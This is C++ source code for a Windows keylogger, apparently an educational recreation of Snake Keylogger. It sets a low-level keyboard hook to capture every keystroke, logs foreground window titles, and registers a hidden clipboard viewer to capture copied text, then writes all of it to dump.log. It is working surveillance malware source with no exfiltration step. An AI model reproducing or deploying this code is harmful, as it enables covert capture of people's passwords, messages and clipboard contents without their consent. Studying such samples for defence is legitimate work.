/*
	Inspiration from https://www.fortinet.com/blog/threat-research/deep-dive-into-a-fresh-variant-of-snake-keylogger-malware
*/

#define _CRT_SECURE_NO_WARNINGS
#define no_init_all
#include <iostream>
#include <Windows.h>
#include <vector>
#include <fstream>

#define PATH	L"dump.log" // File path for the keylogger's output
#define DELAY	4000 // Delay in ms for the main thread

VOID LogClipboardData( VOID );
LRESULT CALLBACK ClipboardViewerProc( HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam );

enum class StringType {
	WINDOW,
	KEY,
	CLIPBOARD
};

HHOOK hHook;
HWND hWndNextViewer = nullptr;
using Element = std::pair<std::wstring, StringType>;
std::vector<Element> records;

// Keyboard hook callback function
LRESULT CALLBACK KeyboardHook( int nCode, WPARAM wParam, LPARAM lParam )
{
	LPKBDLLHOOKSTRUCT kInfo = (LPKBDLLHOOKSTRUCT)lParam;
	/*
		GetKLeyNameText argument 0 requires a 64 bit value containing the scan code and flags;
		We need to shift these two values in the high-order part, plus 1 to avoid negative values.
		-----------------------------------------------------------------------------------------
		1. kInfo->scanCode: This is the scan code of the key that was pressed or released. The scan code is a hardware-specific code that uniquely identifies a key on the keyboard.
		2. kInfo->flags: This represents the extended-key flag. It indicates whether the key is an extended key (such as the right-hand ALT and CTRL keys).
		3. << is the bitwise left shift operator. In this context, it is used to shift the bits of kInfo->scanCode and kInfo->flags to specific positions.
		4. The resulting values are combined to create a 32-bit message identifier (msg). The structure of the message identifier is as follows:
			The lowest 16 bits (bits 0-15) are set to 1.
			The next 8 bits (bits 16-23) contain the shifted value of kInfo->scanCode.
			The highest 8 bits (bits 24-31) contain the shifted value of kInfo->flags.
		This combination is done to ensure that the resulting msg is a 32-bit value where each part (1, scan code, flags) is in a specific position within the 32 bits.
		This msg is then passed as an argument to the GetKeyNameTextW function, which retrieves a string that represents the name of the key associated with the specified key code and extended-key flag.	
	*/
	LONG msg = 1 + (kInfo->scanCode << 16) + (kInfo->flags << 24);
	DWORD vkCode = kInfo->vkCode;
	wchar_t keyName[64];
	GetKeyNameTextW((LONG)msg, keyName, sizeof keyName);

	switch (wParam)
	{
		case WM_KEYDOWN:
			records.push_back(std::make_pair(keyName, StringType::KEY));
			std::wcout << "Captured: " << keyName << std::endl;
			break;
	}

	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// Keylogger thread function
DWORD WINAPI LogKeystrokes( LPVOID lpParam )
{
	// keylogging operations
	printf("Starting keylogging..\n");
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	while (GetMessageA(0, 0, 0, 0)); // Used to create an infinite loop that continously retrieves and dispatches messages from the message queue. The goal is to keep the thread running and processing messages
	
	return 0;
}

DWORD WINAPI LogForegroundWindow( LPVOID lpParam )
{
	HWND currentWnd = nullptr;
	while (true)
	{
		HWND newWnd = GetForegroundWindow();
		
		if (newWnd != currentWnd)
		{
			currentWnd = newWnd;
			wchar_t title[MAX_PATH];
			GetWindowTextW(currentWnd, title, MAX_PATH);
			if (title != nullptr && wcslen(title) > 0)
			{
				records.push_back(std::make_pair(title, StringType::WINDOW));
				std::wcout << "Foreground window changed. Title: " << title << std::endl;
			}
		}
	}
}

// https://learn.microsoft.com/en-us/windows/win32/dataxchg/using-the-clipboard#monitoring-clipboard-contents
LRESULT CALLBACK ClipboardViewerProc( HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam )
{
	switch (message)
	{
	case WM_DRAWCLIPBOARD:
		// Clipboard content changed
		std::cout << "Clipboard content changed" << std::endl;

		if (OpenClipboard(hWnd))
		{
			HANDLE hClipboardData = GetClipboardData(CF_UNICODETEXT);

			if (hClipboardData != nullptr)
			{
				wchar_t* clipboardText = static_cast<wchar_t *>(GlobalLock(hClipboardData));
				if (clipboardText != nullptr && wcslen(clipboardText) > 0)
				{
					records.push_back(std::make_pair(clipboardText, StringType::CLIPBOARD));
					std::wcout << L"Clipboard Text: " << clipboardText << std::endl;
					GlobalUnlock(hClipboardData);
				}
			}

			CloseClipboard();
		}

		// Forward the message to the next viewer in the chain
		SendMessage(hWndNextViewer, message, wParam, lParam);
		break;

	case WM_CHANGECBCHAIN:
		// The next viewer's window handle is being removed
		if (reinterpret_cast<HWND>(wParam) == hWndNextViewer)
		{
			hWndNextViewer = reinterpret_cast<HWND>(lParam);
		}
		else if (hWndNextViewer != nullptr)
		{
			// Forward the message to the next viewer in the chain
			SendMessage(hWndNextViewer, message, wParam, lParam);
		}
		break;

	default:
		// Process other messages
		return DefWindowProc(hWnd, message, wParam, lParam);
	}

	return 0;
}

DWORD WINAPI LogClipboardData(LPVOID lpParam)
{
	// Register a window class for the clipboard viewer
	WNDCLASS wc = {};
	wc.lpfnWndProc = ClipboardViewerProc;
	wc.hInstance = GetModuleHandle(nullptr);
	wc.lpszClassName = L"ClipboardViewerClass";
	RegisterClass(&wc);

	// Create a window for the clipboard viewer (invisible)
	HWND hWndViewer = CreateWindowEx(0, L"ClipboardViewerClass", L"Clipboard Viewer", 0, 0, 0, 0, 0, HWND_MESSAGE, nullptr, nullptr, nullptr);

	// Set the viewer in the clipboard viewer chain
	hWndNextViewer = SetClipboardViewer(hWndViewer);

	// Run the message loop for this thread
	MSG msg;
	while (GetMessage(&msg, nullptr, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Remove the viewer from the clipboard viewer chain
	ChangeClipboardChain(hWndViewer, hWndNextViewer);

	return 1;
}

int main()
{
	DWORD dwThreadId;
	HANDLE hThread, foregroundThread, clipboardThread;

	// 1. Thread that logs the clipboard data
	clipboardThread = CreateThread(NULL, 0, LogClipboardData, NULL, 0, &dwThreadId);
	if (clipboardThread == NULL)
	{
		std::cout << "CreateThread failed: " << GetLastError() << std::endl;
		ExitProcess(1);
	}

	// 2. Thread that logs the foreground window
	foregroundThread = CreateThread(NULL, 0, LogForegroundWindow, NULL, 0, &dwThreadId);
	if (foregroundThread == NULL)
	{
		std::cout << "CreateThread failed: " << GetLastError() << std::endl;
		ExitProcess(1);
	}

	// 3. Thread that performs keylogging operations
	hThread = CreateThread(NULL, 0, LogKeystrokes, NULL, 0, &dwThreadId);
	if (hThread == NULL)
	{
		std::cout << "CreateThread failed: " << GetLastError() << std::endl;
		ExitProcess(1);
	}

	// 4. Wait for the threads and cleanup
	WaitForSingleObject(hThread, DELAY);
	WaitForSingleObject(foregroundThread, DELAY);
	WaitForSingleObject(clipboardThread, DELAY);
	CloseHandle(hThread);
	CloseHandle(foregroundThread);
	CloseHandle(clipboardThread);
	UnhookWindowsHookEx(hHook);
	
	// 5. Write recorded data to the output file
	std::wofstream outputFile(PATH);	
	if (!outputFile.is_open())
	{
		std::cerr << "Error opening output file: " << GetLastError() << std::endl;
		return 0;
	}

	for (const auto& element : records)
	{
		if (element.second == StringType::WINDOW)
			outputFile << L"----------------\nCurrent Window = " << element.first.c_str() << std::endl;
		else if (element.second == StringType::CLIPBOARD)
			outputFile << L"Clipboard context changed. Text = " << element.first.c_str() << std::endl;
		else if (element.second == StringType::KEY)
			outputFile << L"Recorded keys = " << element.first.c_str() << std::endl;
	}
	outputFile << L"----------------" << std::endl;
	outputFile.close();

	return 0;
}